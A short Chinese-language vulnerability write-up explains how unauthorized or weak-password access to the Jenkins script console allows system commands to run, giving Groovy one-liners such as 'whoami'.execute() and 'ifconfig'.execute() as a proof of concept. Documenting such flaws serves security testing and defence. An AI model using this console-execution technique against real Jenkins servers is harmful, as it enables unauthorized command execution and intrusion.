# Jenkins 功能未授权访问导致的远程命令执行漏洞

### 一、漏洞简介

Jenkins管理登陆之后，后台”系统管理”功能，有个”脚本命令行的”功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。

### 二、漏洞影响

### 三、复现过程

找到“系统管理”——“脚本命令行”。

![](images/15890732458818.png)


![](images/15890732522707.png)


输入任意的Groovy脚本并在服务器上执行它。对于故障排除和诊断很有用。使用’println’命令查看输出（如果使用System.out，它将输出到服务器的标准输出，很难看到。）示例：


```bash
println(Jenkins.instance.pluginManager.plugins)
```

在脚本命令行中输入下面的语句，即可执行相应的命令：


```bash
println "whoami".execute().text
```

![](images/15890732734184.png)



```bash
println "ifconfig".execute().text
```

![](images/15890732859289.png)


